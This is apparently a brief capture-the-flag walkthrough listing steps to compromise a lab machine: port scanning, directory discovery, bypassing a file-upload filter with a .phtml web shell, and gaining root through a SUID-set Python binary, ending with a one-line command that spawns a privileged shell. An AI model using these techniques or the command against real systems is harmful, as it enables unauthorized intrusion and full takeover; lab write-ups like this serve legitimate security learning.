start with nmap

http and ssh open.

ffuf.

/panel
/uploads

we can upload file in /panel.

file will be stored at /uploads.

bypass upload funcitonality.

shell.phtml

get shell.

suit bit is set to /usr/bin/python.

get root shell.

python -c 'import os; os.execl("/bin/sh", "sh", "-p")'